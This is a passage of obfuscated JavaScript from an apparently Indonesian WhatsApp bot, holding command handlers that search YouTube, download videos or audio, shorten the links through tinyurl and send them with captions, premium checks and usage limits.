_0x38002c={};_0x38002c[_0x72a199(-0x27,0x19,0x299,0x151)+'t']=_0x72a199(0xbc,-0xa5,0x1dd,0x6cc)+_0x900b9e(0xbb8,0x1059,0xb3d,0xb28);function _0x900b9e(_0xb30ccf,_0xcf513f,_0x4accc4,_0x2c1c76){return _0x25c4ad(_0xb30ccf-0x312,_0xcf513f-0xdd,_0x4accc4-0x14e,_0x4accc4);}const _0x4cb74f={};_0x4cb74f[_0x900b9e(0x2d0,-0x48,0x5c,0xaa)]=_0x72a199(0x966,0xf1,0x5cf,0x96f)+'\x20'+args[0x1cce+0xfb0+-0x2c7e];function _0x72a199(_0x1781e5,_0x549153,_0x18a4fa,_0x353772){return _0x25c4ad(_0x18a4fa-0x2fd,_0x549153-0x7d,_0x18a4fa-0x62,_0x1781e5);}_0x4cb74f[_0x900b9e(0x196,0x387,0x6a,0x18f)]=_0x38002c,_0x4cb74f[_0x72a199(0x558,0xe15,0xa5b,0x783)]=_0x449ae4[_0x900b9e(0x802,0x692,0x6f6,0xa9a)];const _0x513fb0={};_0x513fb0[_0x900b9e(0x2ae,-0x1a8,0x241,0x75c)+'t']=_0x449ae4['yTItM'];const _0x5e7a59={};_0x5e7a59[_0x72a199(0x387,0xb0,0x2bb,-0xc5)]=_0x72a199(0x8f4,0x63f,0xa0f,0x8cb)+args[-0x8ad*-0x3+0x22fa+-0x3d01],_0x5e7a59[_0x900b9e(0x196,0x661,0x386,0x488)]=_0x513fb0,_0x5e7a59[_0x900b9e(0xa70,0x840,0xf79,0x944)]=_0x449ae4['oAMxE'];let _0x2aee81=[_0x2b21c4,_0x4cb74f,_0x5e7a59];_0x449ae4[_0x72a199(0xe2a,0xc5c,0x94b,0x47d)](sendButLocation,from,_0xa886ed,_0x72a199(0xc34,0x4d5,0x98b,0x487)+enter+(_0x72a199(0x468,0xc6b,0x7de,0xbac)+_0x72a199(0x250,0x124,0x3cf,0x411)+_0x900b9e(0x844,0x483,0xb3a,0x719)+_0x72a199(0x747,0xb32,0x8d7,0xa13)+_0x900b9e(0x659,0x450,0x46e,0x509)+'an\x20tonton\x20'+_0x900b9e(0x89e,0x67b,0xb04,0xa0f)+_0x900b9e(0xa8e,0x931,0x951,0xdee)+_0x900b9e(0x8b5,0x7a4,0x5dc,0x5f4)+_0x72a199(0x488,0x4ab,0x754,0x666))+enter+enter+botname+_0x72a199(0x309,-0x2f,0x2c6,0x9a)+ownername,_0xaaaa3d,_0x2aee81,{});});});}catch(_0x1e8fda){reply(mess['error']['api']);}await limitAdd(sender,limit);break;case _0x593f96(0x843,0x4a5,0x3fc,0x339):{if(args['length']===0xb5d*-0x2+-0x6*0x246+0x245e)return reply(_0x1e23e4(0x935,0x604,0x99a,0xdfe)+_0x593f96(0xb40,0xc47,0x995,0xe82)+prefix+('video*\x20_Ju'+_0x1e23e4(0xc41,0x747,0x9aa,0x874)+_0x1e23e4(-0x118,0x4f5,0x261,0x65b)+'dicari_'));var srch=args[_0x593f96(0xc2f,0x898,0x964,0xe67)]('');aramas=await yts(srch),server=_0x593f96(0x911,0x4bb,0xb05,0xd55),aramat=aramas[_0x1e23e4(0xa3,0x1cd,0x4b0,0x59a)];var mulaikah=aramat[-0x6c7*0x4+0xa16+0x2*0x883][_0x1e23e4(0x1a,0x600,0x153,-0x275)];try{ytv2(mulaikah,server)['then'](_0xa9df4f=>{const _0xde5c55={'IzrQu':function(_0x4083fc,_0x242bb6){return _0x4083fc(_0x242bb6);},'LKDhS':function(_0x2ec9e1,_0xc3bd59,_0x2882b3,_0x25f0f8){return _0x2ec9e1(_0xc3bd59,_0x2882b3,_0x25f0f8);},'gkRnd':function(_0x5d5d93,_0x23f00b,_0x2f6999,_0x3b7168){return _0x5d5d93(_0x23f00b,_0x2f6999,_0x3b7168);},'cTOwR':_0x57605e(0x73d,0x516,0x388,0x763)};function _0x57605e(_0x3eab73,_0x5d0e10,_0x1ce464,_0x83332c){return _0x1e23e4(_0x3eab73-0x75,_0x5d0e10-0x10,_0x83332c- -0x36f,_0x1ce464);}function _0x2f9282(_0x3a211e,_0x502042,_0x176015,_0x1cc4f1){return _0x1e23e4(_0x3a211e-0x29,_0x502042-0x16e,_0x176015- -0x258,_0x1cc4f1);}const {dl_link:_0x1100c1,thumb:_0x540c0d,title:_0x36c995,filesizeF:_0x48cc24,filesize:_0x3257c1}=_0xa9df4f;axios[_0x2f9282(0x5c8,-0x1b2,0x149,0x190)](_0x2f9282(0x4a,-0x427,0xd1,0x9e)+'nyurl.com/'+'api-create'+_0x57605e(0x304,0x7df,0x381,0x5f7)+_0x1100c1)[_0x2f9282(0x7d6,0x359,0x40f,0x3ef)](async _0xe3d436=>{if(_0xde5c55[_0x37f761(0x67b,0x796,0x8e4,0x6df)](Number,_0x3257c1)>=-0x1386d+-0x9*0x5db+0xbcf*0x40)return _0xde5c55[_0x1665fe(0x59f,0xa1f,0x8fe,0x89d)](sendMediaURL,from,_0x540c0d,_0x37f761(0x9fd,0x51e,0x15a,0x7c0)+_0x1665fe(0x87f,0x64e,0x8cf,0x84a)+enter+enter+('🐣\x20*Title*\x20'+':\x20')+_0x36c995+enter+(_0x37f761(0x63d,0x724,0x2dc,0x9d0)+_0x1665fe(0x896,0xb31,0x6c0,0x739))+enter+(_0x37f761(0x9c0,0x5f0,0x274,0x5c4)+_0x1665fe(0x1002,0xfc1,0xfbf,0xc02))+_0x48cc24+enter+(_0x1665fe(0x993,0xadd,0xc88,0xde6)+'\x20')+_0xe3d436['data']+enter+enter+(_0x1665fe(0xb8d,0x7bd,0x7b7,0x724)+_0x1665fe(0x804,0xbb,0x288,0x476)+_0x37f761(0x6d7,0xa1a,0xd18,0x8b0)+_0x1665fe(0x828,0x98d,0xbc1,0xbfb)+_0x37f761(0xa1b,0x9f8,0xaaf,0x4fc)+_0x37f761(0xcb7,0xa19,0xae2,0xe43)));const _0x1b77f9='*📽️\x20YOUTUBE'+'-PLAY\x20MP4*'+enter+enter+(_0x1665fe(0xb1d,0xdcf,0xbc9,0x905)+':\x20')+_0x36c995+enter+enter+('🦁\x20*Ext*\x20:\x20'+_0x1665fe(0xa2d,0x1067,0x7f9,0xb54))+enter+(_0x37f761(0x1dd,0x1ac,-0x1a0,0x5d0)+'\x20')+_0x48cc24+enter+('🐺\x20*Link*\x20:'+'\x20')+_0xe3d436['data']+enter+enter+(_0x1665fe(0xe5b,0x9f8,0xc51,0xca6)+'tunggu\x20fil'+'e\x20media\x20se'+_0x1665fe(0xfc6,0x8c6,0x1004,0xd97)+'im\x20mungkin'+_0x1665fe(0x1a9,0x885,0x69a,0x471)+_0x1665fe(0x4a3,0x5d7,0x6f2,0x8e0)+'t_');_0xde5c55[_0x1665fe(0xe95,0x836,0x963,0xbd2)](sendMediaURL,from,_0x540c0d,_0x1b77f9);const _0xfbc614={};_0xfbc614[_0x1665fe(0x8f8,0x83a,0xff2,0xbdc)]=_0xde5c55[_0x37f761(0x39c,0x17e,-0x69,-0x5e)],_0xfbc614[_0x37f761(0xc2,0x3dd,0x10,0x2fb)]=_0x36c995+_0x1665fe(0xc09,0x9c3,0x8b6,0x800),_0xfbc614[_0x1665fe(0xec7,0xf64,0xbed,0xad4)]=fgclink2,_0xfbc614[_0x37f761(0xbb0,0x913,0x79b,0xe1c)+'o']={},_0xfbc614[_0x37f761(0xbb0,0x913,0x79b,0xe1c)+'o'][_0x1665fe(0x9d7,0xf50,0xd14,0xb51)+_0x37f761(0x208,0x655,0x945,0x788)]=0x1fc;function _0x37f761(_0x16ae7f,_0x52e289,_0x216735,_0x2af087){return _0x57605e(_0x16ae7f-0x24,_0x52e289-0x5a,_0x216735,_0x52e289-0x3bc);}_0xfbc614[_0x37f761(0xbb0,0x913,0x79b,0xe1c)+'o'][_0x37f761(0x867,0xafc,0xf83,0x7da)+'d']=!![],_0xfbc614[_0x37f761(0xbb0,0x913,0x79b,0xe1c)+'o'][_0x1665fe(0x8eb,0x49c,0x9fb,0x6f1)+_0x37f761(0x37e,0x143,0x5f6,0x44e)]={},_0xfbc614[_0x37f761(0xbb0,0x913,0x79b,0xe1c)+'o'][_0x1665fe(0x8eb,0x49c,0x9fb,0x6f1)+_0x37f761(0x37e,0x143,0x5f6,0x44e)][_0x37f761(0xb98,0x7c7,0xc8e,0xb2d)]=_0x36c995,_0xfbc614[_0x37f761(0xbb0,0x913,0x79b,0xe1c)+'o'][_0x1665fe(0x8eb,0x49c,0x9fb,0x6f1)+_0x37f761(0x37e,0x143,0x5f6,0x44e)][_0x1665fe(0x42d,-0x7,-0x44,0x3ff)]='';function _0x1665fe(_0x3431f6,_0x497235,_0x5ab789,_0x39ce67){return _0x2f9282(_0x3431f6-0x7c,_0x497235-0x123,_0x39ce67-0x579,_0x3431f6);}_0xfbc614[_0x37f761(0xbb0,0x913,0x79b,0xe1c)+'o'][_0x1665fe(0x8eb,0x49c,0x9fb,0x6f1)+_0x37f761(0x37e,0x143,0x5f6,0x44e)][_0x1665fe(0x44e,0x5a7,0x570,0x890)]='2',_0xfbc614[_0x37f761(0xbb0,0x913,0x79b,0xe1c)+'o'][_0x1665fe(0x8eb,0x49c,0x9fb,0x6f1)+_0x37f761(0x37e,0x143,0x5f6,0x44e)][_0x1665fe(0x393,0x449,0x583,0x58d)]=pp_userz,_0xfbc614[_0x37f761(0xbb0,0x913,0x79b,0xe1c)+'o'][_0x1665fe(0x8eb,0x49c,0x9fb,0x6f1)+_0x37f761(0x37e,0x143,0x5f6,0x44e)]['mediaUrl']=_0x37f761(0xa9b,0xa0b,0x9ff,0xc98)+'utube.com/'+_0x37f761(0xb99,0xb2e,0xd3e,0xbce)+'c',await sendFileFromUrlF(_0x1100c1,document,_0xfbc614)[_0x37f761(0xa9d,0xafb,0x645,0xc76)](()=>reply('Emror'));});});}catch(_0x459a3d){reply(mess['error']['api']);}}await limitAdd(sender,limit);break;case _0x593f96(0x88e,0x8cb,0x6f8,0x617):if(args[_0x593f96(0xae8,0xb1f,0xa4b,0xdcb)]===0xba0+-0x1c92+0x5a6*0x3)return reply('Kirim\x20peri'+_0x593f96(0xb40,0xf5d,0xdd0,0xf0e)+prefix+(_0x1e23e4(0x2d2,-0x3a,0x407,-0x3e)+'kYt]*'));let isLinks=args[-0x1cfa*0x1+-0xcd6+0x37c*0xc][_0x593f96(0x2af,-0x198,0x406,-0x23e)](/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/);if(!isLinks)return reply(mess[_0x1e23e4(0x6bf,0x68c,0x577,0x602)]['Iv']);try{reply(lang[_0x1e23e4(0x0,0x23b,0x143,0x2e7)]());let yut=await yts(args[0x1*0x22df+-0x753+-0xa4*0x2b]);yta(args[0x1ef6+-0x1*0x1136+-0xdc0])[_0x593f96(0x845,0x515,0x557,0x4d8)](_0x5224f8=>{function _0x41995a(_0xd423cd,_0x10e81f,_0x56d0bb,_0x492e08){return _0x593f96(_0x492e08- -0x1aa,_0x10e81f,_0x56d0bb-0x15b,_0x492e08-0x115);}const _0x3f88c2={'ovktC':function(_0x373099,_0x187e17){return _0x373099>=_0x187e17;},'qgFmB':function(_0x12ca8c,_0x1d9ade){return _0x12ca8c(_0x1d9ade);},'GYAXS':function(_0x24d3d0,_0x51e3be,_0x43d1d3,_0x5b736d){return _0x24d3d0(_0x51e3be,_0x43d1d3,_0x5b736d);},'pvBov':function(_0x37a37c,_0x4b413c){return _0x37a37c(_0x4b413c);},'WzROg':_0x41995a(0x55c,0x449,0x13c,0x44c),'pnsTX':_0x50ed1c(-0x1d1,0x1de,0x1e5,-0x20b),'IYObO':_0x41995a(0xa31,0x4d2,0x976,0x7af),'gtzvA':function(_0x4ce56e,_0x440ca8,_0x55241c,_0x14fe01,_0x79adac,_0x1073c7,_0x23d8e5){return _0x4ce56e(_0x440ca8,_0x55241c,_0x14fe01,_0x79adac,_0x1073c7,_0x23d8e5);}};function _0x50ed1c(_0x2ca4b9,_0x1b063a,_0x2ed672,_0x3993cc){return _0x1e23e4(_0x2ca4b9-0x1a2,_0x1b063a-0x66,_0x1b063a-0xb,_0x2ca4b9);}const {dl_link:_0x26ca6b,thumb:_0x106a15,title:_0x3dafa8,filesizeF:_0xa80b8e,filesize:_0x48bce9}=_0x5224f8;axios['get'](_0x41995a(0x51d,0x1ff,0x7df,0x35d)+'nyurl.com/'+_0x41995a(0x673,0xa0e,0x61c,0x781)+_0x41995a(0xda2,0xaed,0xc7c,0x99a)+_0x26ca6b)[_0x50ed1c(0x897,0x672,0x874,0x653)](async _0x368571=>{if(_0x3f88c2['ovktC'](_0x3f88c2[_0x1c32dd(0xbda,0x68a,0x7e1,0x3ab)](Number,_0x48bce9),-0x1*-0x3da9+-0x16d9+0x1*0x4e60))return _0x3f88c2['GYAXS'](sendMediaURL,from,_0x106a15,_0x386257(0x3cc,0x795,0x347,0x324)+'asil\x20Didap'+_0x386257(0x56f,0x4d7,0x4a7,0x65e)+enter+enter+_0x1c32dd(0x116e,0x111d,0xccf,0xfd0)+_0x3dafa8+enter+('🦁\x20Ext\x20:\x20MP'+'3')+enter+(_0x386257(0x1c,0x2bf,0x201,0x4cb)+_0x1c32dd(0x939,0xa24,0x925,0x9a2))+_0xa80b8e+enter+_0x1c32dd(0x47f,0x571,0x3e3,0x481)+_0x368571[_0x1c32dd(0xb76,0x9a7,0xa5d,0xcab)]+enter+enter+('_Untuk\x20dur'+_0x1c32dd(0x6a7,0x911,0x468,0x66d)+_0x1c32dd(0xf81,0x116b,0xce0,0xe17)+_0x1c32dd(0x7a8,0xb14,0xbed,0xada)+'\x20dalam\x20ben'+_0x1c32dd(0xf76,0xb9f,0xcdf,0xae8)));const _0x374031=_0x386257(-0x63,-0x21c,0x1ec,0x2ad)+_0x1c32dd(0x95f,0xcb9,0xa2c,0xd8f)+_0x386257(0x429,0x396,0x7d7,0x59d)+':\x20'+_0x3dafa8+(_0x386257(0x240,0x8b9,0xb8,0x4f3)+_0x386257(0x896,0xdb,0xab3,0x5c5))+yut['videos'][0xa7e*-0x1+-0x1*0x51+0xacf][_0x1c32dd(0x643,0xa10,0x863,0x3b4)]+(_0x386257(0x508,0x851,0x837,0x380)+':\x20')+yut['videos'][0x144+0xaf7+-0xc3b][_0x1c32dd(0x412,0x807,0x6b6,0x7a5)]+(_0x386257(0x2d,-0x124,0x578,0x32c)+'\x20')+_0x48bce9+('\x20kb\x0a🍃\x20View'+_0x1c32dd(0x1130,0xd87,0xcfb,0xf21))+yut[_0x1c32dd(0x28d,0x162,0x4e3,0x4bf)][0x1fe7+-0x788+-0x185f][_0x1c32dd(0x77c,0x71c,0xacf,0xd39)]+('\x20\x0a🐣\x20Durati'+_0x386257(-0xcd,0x747,0x7a3,0x3c0))+yut[_0x386257(0x1b7,0x57,0x5a1,0x325)][0x1b1*0x17+-0x1d29*0x1+-0x9be]['timestamp']+_0x386257(0x54e,0x738,-0x6f,0x456)+yut[_0x386257(0x250,-0x2b,0x7d0,0x325)][-0x2622+-0x4a*-0x51+0xeb8][_0x386257(0x225,0x633,0x501,0x2a8)];let _0x292cc4=await _0x3f88c2[_0x386257(0x8f,0x332,-0x3f,0x2a3)](getBuffer,_0x106a15);const _0x21b9e0={};_0x21b9e0[_0x386257(0x5a4,0x12,0x622,0x333)+'t']=_0x3f88c2[_0x386257(0x3c4,0x377,0x1d1,0x2d9)];const _0x4da0ad={};function _0x1c32dd(_0x39ab9b,_0x5c1849,_0x1e1d95,_0x4f1bc9){return _0x41995a(_0x39ab9b-0xf1,_0x39ab9b,_0x1e1d95-0xa5,_0x1e1d95-0x2df);}_0x4da0ad[_0x386257(0x26f,-0x7c,0x204,0x355)]=_0x1c32dd(0xf1f,0xfaa,0xb47,0x8ef)+q,_0x4da0ad[_0x386257(0x4b6,-0x296,0x27d,0x21b)]=_0x21b9e0,_0x4da0ad[_0x1c32dd(0xd7f,0x10d3,0xcb3,0x1194)]=_0x386257(0x7e2,0x729,0xc65,0x8d0);function _0x386257(_0x2b561b,_0x36dec3,_0x310be1,_0x16cd57){return _0x50ed1c(_0x2b561b,_0x16cd57-0x14a,_0x310be1-0x43,_0x16cd57-0x1eb);}const _0x29e416={};_0x29e416['displayTex'+'t']=_0x3f88c2[_0x386257(0x3d1,0x44b,0x54d,0x2a2)];const _0x4be46f={};_0x4be46f[_0x1c32dd(0x2d1,0x320,0x513,0x246)]=_0x1c32dd(0x4dc,0x670,0x7ab,0x9dc)+q,_0x4be46f[_0x1c32dd(0x667,0x4af,0x3d9,0x507)]=_0x29e416,_0x4be46f['type']=_0x3f88c2['IYObO'];let _0x55b135=[_0x4da0ad,_0x4be46f];_0x3f88c2[_0x386257(0x7ba,0x14f,0x50d,0x3e3)](sendButLocation,from,_0x374031,_0x1c32dd(0x73a,0x8c6,0xbe3,0xb14)+enter+(_0x386257(0x5a6,0x5e5,0x43a,0x878)+'app\x20mod\x20ka'+_0x386257(0x579,0x4af,0x7f0,0x8c9)+_0x1c32dd(0x8eb,0x8b5,0xb2f,0xff9)+_0x1c32dd(0xdb4,0xb6c,0x89c,0x929)+_0x1c32dd(0xc4,0x6d7,0x54d,0x9db)+'video\x20ini\x20'+_0x1c32dd(0x85f,0xe6d,0xcd1,0xc2d)+'utu.be/ERG'+_0x1c32dd(0x611,0xc76,0x9ac,0xd6d))+enter+enter+botname+_0x386257(0x17b,0x1db,0x802,0x360)+ownername,_0x292cc4,_0x55b135,{});});});}catch(_0x41716c){reply(mess[_0x593f96(0x755,0x9f4,0x6a1,0x462)][_0x593f96(0xcc7,0xf08,0x988,0xea1)]);}await limitAdd(sender,limit);break;case _0x1e23e4(0x2da,0x85b,0x72f,0x456):{if(args['length']===0x14df+0x56c+-0x1a4b)return reply(_0x593f96(0xb78,0x91d,0x89d,0xfda)+_0x593f96(0xb40,0xf0a,0xcbb,0xbd0)+prefix+(_0x1e23e4(0x5df,0x7e1,0x2f4,0x399)+_0x1e23e4(0x863,0xcc6,0x9aa,0xa2e)+_0x593f96(0x43f,0x51,0x161,0x36b)+_0x593f96(0x43b,0x12b,-0xb0,0x1df)));var srch=args[_0x593f96(0xc2f,0xaea,0x749,0x106a)]('');aramas=await yts(srch),server=_0x593f96(0x911,0xcb9,0xb87,0x5a0),aramat=aramas[_0x1e23e4(0x21d,0x8b2,0x4b0,0x60b)];var mulaikah=aramat[0x106*-0x5+-0x203f+-0x255d*-0x1]['url'];try{ytv2(srch,server)['then'](_0xc6c822=>{function _0x1ecc7a(_0xe6c669,_0x158040,_0x3aa2aa,_0x4b3d03){return _0x593f96(_0x3aa2aa-0xa6,_0x158040,_0x3aa2aa-0xd3,_0x4b3d03-0xd7);}const _0x23200f={'GIRcT':_0x26f4c4(0x171,0x267,0x93f,0x609),'oezJP':function(_0x2bf468,_0x144667){return _0x2bf468(_0x144667);},'vbYvS':function(_0xc996d1,_0x4cddeb,_0x2870ea,_0x5c6971){return _0xc996d1(_0x4cddeb,_0x2870ea,_0x5c6971);}};function _0x26f4c4(_0x16ff23,_0x27e5af,_0x1723c3,_0x5877f6){return _0x1e23e4(_0x16ff23-0x1ed,_0x27e5af-0x53,_0x5877f6-0x25f,_0x16ff23);}const {dl_link:_0x225e84,thumb:_0x544a8e,title:_0x1de355,filesizeF:_0x11dc3c,filesize:_0x8ac6cb}=_0xc6c822;axios['get'](_0x1ecc7a(0xa3b,0x486,0x5ad,0x5b4)+'nyurl.com/'+_0x26f4c4(0x540,0x6a6,0xa1a,0x9ac)+_0x1ecc7a(0xb84,0xdec,0xbea,0xdd0)+_0x225e84)[_0x1ecc7a(0x606,0x4b9,0x8eb,0x685)](async _0x749acc=>{if(_0x23200f[_0x5044f3(0x107a,0xd75,0xa4c,0xd1e)](Number,_0x8ac6cb)>=0x1b369+0x1*0x69ea+-0x96b3)return sendMediaURL(from,_0x544a8e,'*📽️\x20YOUTUBE'+_0x5044f3(0x530,0xc92,0x49b,0x7c3)+enter+enter+(_0x4a1b09(0xad8,0xc0f,0x546,0x9b0)+':\x20')+_0x1de355+enter+(_0x5044f3(0x94a,0x6d7,0x333,0x80d)+_0x5044f3(0xdf,0x51b,0x634,0x448)+'s')+enter+('🦁\x20*Ext*\x20:\x20'+'MP3')+enter+('🐭\x20*Filesiz'+_0x4a1b09(0xd95,0xa46,0xad0,0xcad))+_0x11dc3c+enter+(_0x5044f3(0xbe7,0xae2,0x1000,0xbbd)+'\x20')+_0x749acc['data']+enter+enter+(_0x4a1b09(0xbbc,0xb6e,0x4de,0x7cf)+_0x4a1b09(0x42f,0x6c4,0x55,0x521)+_0x4a1b09(0xb09,0xc17,0x10b1,0xd99)+_0x4a1b09(0xade,0xef7,0xa8f,0xca6)+_0x5044f3(0x104f,0x8a7,0x988,0xc45)+_0x4a1b09(0x1099,0x1046,0xb14,0xd98)));function _0x5044f3(_0x28ad7f,_0x532420,_0x148306,_0x119948){return _0x1ecc7a(_0x28ad7f-0x9c,_0x28ad7f,_0x119948-0x16,_0x119948-0x37);}function _0x4a1b09(_0x54f98c,_0x43330d,_0x196214,_0x27ce93){return _0x1ecc7a(_0x54f98c-0x3f,_0x54f98c,_0x27ce93-0x148,_0x27ce93-0xdb);}_0x23200f[_0x5044f3(0xfdf,0x799,0xa14,0xb62)](sendMediaURL,from,_0x225e84,'')[_0x5044f3(0x120a,0xcb2,0x8a9,0xd48)](_0x417e85=>{function _0x2125ac(_0x54bf02,_0x1a674e,_0x45959c,_0x21f634){return _0x4a1b09(_0x21f634,_0x1a674e-0x1dd,_0x45959c-0x90,_0x45959c- -0x65e);}reply(_0x23200f[_0x2125ac(0xe3,0x31f,0xcf,-0x1ac)]);});});});}catch(_0x381619){reply(mess[_0x593f96(0x755,0xb3b,0x324,0x474)][_0x1e23e4(0xa63,0x8b8,0xae9,0xb50)]);}}await limitAdd(sender,limit);break;case _0x593f96(0x6f2,0x318,0x80b,0x533):{const _0x1cce5c={};_0x1cce5c[_0x1e23e4(-0x2f5,0x51a,0x1de,-0x249)+'t']=_0x593f96(0xad1,0x90a,0x9ff,0xd1f)+_0x1e23e4(0x4f4,0x9a3,0x534,0x614);const _0x5baddd={};_0x5baddd['buttonId']=_0x593f96(0xb76,0xb7c,0x7ce,0xd5a),_0x5baddd[_0x593f96(0x2a4,0x3e5,0x45c,-0x241)]=_0x1cce5c,_0x5baddd[_0x1e23e4(0x8f7,0xa38,0x9a0,0x953)]=0x1;const _0x54edb4={};_0x54edb4[_0x593f96(0x991,0x657,0xd9b,0xb8f)]=mek;if(!isPremium)return sendButMessage(from,_0x593f96(0x3ed,0x248,0x8,0x50)+_0x1e23e4(0x56c,0x138,0x54e,0x25c)+'\x20khusus\x20un'+_0x1e23e4(0x7a8,0x41e,0x5ac,0x330)+_0x593f96(0x8b9,0x418,0x680,0xc0b)+'a!\x20Upgrade'+_0x593f96(0xaff,0xb55,0xcfd,0xcd6)+_0x1e23e4(0x432,0x109,0x3d1,0x85e)+_0x1e23e4(0x9c1,0x894,0xa87,0x669)+_0x1e23e4(0x1a4,0xad,0x4be,0x595)+prefix+_0x1e23e4(0xe02,0xda4,0x998,0x6a6),_0x593f96(0x962,0xb47,0x98b,0x4e6)+_0x1e23e4(0x5b3,0x82b,0x5a1,0x207),[_0x5baddd],_0x54edb4);if(args[_0x593f96(0xae8,0x6d4,0xeb7,0xe28)]===0x2*-0xfe5+-0x2149+0x4113)return reply('Kirim\x20peri'+_0x1e23e4(0x505,0xcba,0x962,0x9db)+prefix+('video*\x20_Ju'+_0x593f96(0xb88,0xf1c,0xff2,0x6b7)+_0x593f96(0x43f,0x374,0x7dc,0x2cb)+_0x593f96(0x43b,0x30e,0x483,0x333)));var srch=args['join']('');aramas=await yts(srch),server=_0x1e23e4(0x5f5,0xbe0,0x733,0x770),aramat=aramas[_0x593f96(0x68e,0x73f,0xa75,0x725)];var mulaikah=aramat[0x9a1+0x1*0x24e1+-0x2e82][_0x593f96(0x331,0x4fa,0x182,-0xd4)];try{ytv3(srch,server)[_0x593f96(0x845,0x8c3,0x5d0,0x44b)](_0xe67e6e=>{function _0x3391a7(_0x25f82a,_0x29e3b6,_0x56ee60,_0x35c355){return _0x593f96(_0x25f82a- -0x74,_0x29e3b6,_0x56ee60-0x3c,_0x35c355-0x138);}const _0x30bee4={'SUxwG':function(_0x2f7cc4,_0x1dd2d0){return _0x2f7cc4(_0x1dd2d0);},'yPoyz':'reply\x20pesa'+'n\x20botnya\x20','eiNhR':function(_0x9c37df,_0x1ddfd1){return _0x9c37df(_0x1ddfd1);},'gIaUJ':_0x3391a7(0x514,0x561,0x394,0xa17),'gRhyp':function(_0x3c2334,_0x376873){return _0x3c2334===_0x376873;},'azJbI':_0x9af93c(0x776,0x80d,0x8a2,0xb70),'EyCES':function(_0x201c46,_0x3b6ba5){return _0x201c46>=_0x3b6ba5;},'vUuQW':function(_0x5976a9,_0x100922,_0x4580c3,_0x24aeb5){return _0x5976a9(_0x100922,_0x4580c3,_0x24aeb5);}},{dl_link:_0x306d27,thumb:_0x5c375b,title:_0x1ade6e,filesizeF:_0x25cee6,filesize:_0x519aba}=_0xe67e6e;function _0x9af93c(_0x57e97a,_0x12f17c,_0x5804b7,_0x4c8031){return _0x1e23e4(_0x57e97a-0x106,_0x12f17c-0x1cf,_0x12f17c-0x100,_0x57e97a);}axios[_0x9af93c(0x5ec,0x4a1,0x1f2,0xb7)](_0x9af93c(0x314,0x429,0x7f2,0x2c2)+'nyurl.com/'+_0x3391a7(0x8b7,0xb76,0xb3e,0xaf7)+'.php?url='+_0x306d27)[_0x3391a7(0x7d1,0x511,0x4c5,0x7a1)](async _0x3b6a73=>{const _0x42b6cf={'ICtvX':function(_0x64a03d,_0x239e1f){function _0x5e9b17(_0x15e8ae,_0x5838f2,_0xcb1079,_0x40d7a1){return _0x1511(_0x40d7a1- -0x1c0,_0xcb1079);}return _0x30bee4[_0x5e9b17(0x28a,0x7c3,0x12b,0x2cb)](_0x64a03d,_0x239e1f);},'KsOfE':_0x30bee4[_0x1abe36(0x777,0xb39,0x896,0xab4)]};function _0x1abe36(_0x21848e,_0x3a92eb,_0x31dfc9,_0x32293b){return _0x9af93c(_0x3a92eb,_0x31dfc9- -0x8f,_0x31dfc9-0x47,_0x32293b-0x93);}function _0x1bea7d(_0x51cec0,_0x2808f6,_0x482989,_0x18f463){return _0x3391a7(_0x2808f6-0x94,_0x51cec0,_0x482989-0x16c,_0x18f463-0xa8);}if(_0x30bee4[_0x1abe36(0x4e,0x29c,0x1f6,0x389)](_0x30bee4[_0x1bea7d(0xe5b,0xc9e,0xcbe,0x1073)],_0x1abe36(0x6ef,0x3ad,0x77e,0x56c))){if(_0x30bee4['EyCES'](_0x30bee4['eiNhR'](Number,_0x519aba),-0x1fee9+0x685*0x4f+-0x3d*-0x656))return _0x30bee4[_0x1bea7d(0x421,0x770,0x4cd,0x4eb)](sendMediaURL,from,_0x5c375b,_0x1abe36(0x72f,0x5bc,0x542,0x188)+'-PLAY\x20MP4*'+'*'+enter+enter+(_0x1bea7d(0xaa0,0x7e2,0x5f6,0x44a)+':\x20')+_0x1ade6e+enter+(_0x1bea7d(0x4c1,0x771,0xae0,0x5fc)+_0x1abe36(0xafd,0x5a5,0x8ec,0xbfc)+'s')+enter+(_0x1abe36(0xa4c,0x82e,0x748,0xb76)+'MP3')+enter+(_0x1bea7d(0x69a,0x7a1,0x3a6,0x9af)+'e*\x20:\x20')+_0x25cee6+enter+(_0x1abe36(0x4df,0xd57,0x994,0x60c)+'\x20')+_0x3b6a73['data']+enter+enter+(_0x1bea7d(0xa7e,0x601,0x6ff,0x8f7)+'asi\x20lebih\x20'+_0x1abe36(0x9bc,0xe5e,0xa3e,0xe4c)+'\x20disajikan'+_0x1bea7d(0xbb7,0xba9,0xd42,0xbaa)+_0x1abe36(0xa7a,0xb5b,0xa3d,0xe29)));sendMediaURL(from,_0x306d27,'')[_0x1bea7d(0xc5b,0xcac,0x984,0xe6c)](_0x60e77c=>{function _0x16f2b6(_0x593999,_0x587dcb,_0x114218,_0x2fe0cb){return _0x1abe36(_0x593999-0x1c9,_0x114218,_0x587dcb-0xa6,_0x2fe0cb-0xe5);}function _0xf58c7d(_0x14c983,_0x30d088,_0x6b0262,_0x2039c3){return _0x1bea7d(_0x2039c3,_0x30d088- -0x542,_0x6b0262-0x184,_0x2039c3-0x5e);}_0x42b6cf[_0xf58c7d(0x1b6,0x27f,0x6a7,0x5f4)](reply,_0x42b6cf[_0x16f2b6(0x6d1,0x7ba,0x4cd,0x65d)]);});}else _0x30bee4['SUxwG'](_0x7ede96,_0x30bee4['yPoyz']),_0x30bee4[_0x1bea7d(0x962,0x456,0x2f6,0x642)](_0x49a120,_0x12949b),_0x33d834[_0x1abe36(0x7c3,0x5fe,0x5ff,0x9b4)](_0x10bccc);});});}catch(_0xd5da1f){reply(mess[_0x1e23e4(0x64a,0x5ae,0x577,0x6c7)][_0x593f96(0xcc7,0xdb3,0x11d4,0x11ba)]);}}await limitAdd(sender,limit);break;case _0x1e23e4(-0x15,0xf,0x468,-0x47)+'d':{const _0x44abe2={};_0x44abe2['displayTex'+'t']=_0x1e23e4(0x56f,0xbfb,0x8f3,0xd6d)+_0x1e23e4(0x18d,0x2e3,0x534,0x9d4);const _0x4f6b2d={};_0x4f6b2d[_0x1e23e4(0x42a,-0x83,0x200,-0xb9)]='goprem',_0x4f6b2d[_0x1e23e4(0x2bc,0x441,0xc6,-0x330)]=_0x44abe2,_0x4f6b2d[_0x1e23e4(0xcb1,0xcf4,0x9a0,0x81b)]=0x1;const _0x18a8bc={};_0x18a8bc['quoted']=mek;if(!isPremium)return 